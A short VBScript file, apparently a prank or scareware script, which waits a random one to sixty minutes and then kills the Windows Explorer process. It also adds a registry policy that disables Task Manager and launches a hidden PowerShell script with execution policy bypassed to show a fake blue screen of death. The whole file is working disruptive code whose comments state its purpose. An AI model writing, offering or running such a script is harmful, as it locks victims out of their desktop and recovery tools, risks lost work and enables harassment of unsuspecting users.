Dim objShell, WshShell, delay

Set objShell = CreateObject("WScript.Shell")
Set WshShell = CreateObject("WScript.Shell")

' Generate a truly random delay between 1 minute (60,000ms) and 60 minutes (3,600,000ms)
Randomize
delay = Int((Rnd * 60) + 1) * 60000 ' Random delay in milliseconds

WScript.Sleep delay ' Wait for the random time

' Disable Task Manager & Explorer
objShell.Run "taskkill /F /IM explorer.exe", 0, True
objShell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", 0, True

' Launch the fake BSOD
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %USERPROFILE%\fake_bsod.ps1", 0, True

' Clean up
Set objShell = Nothing
Set WshShell = Nothing
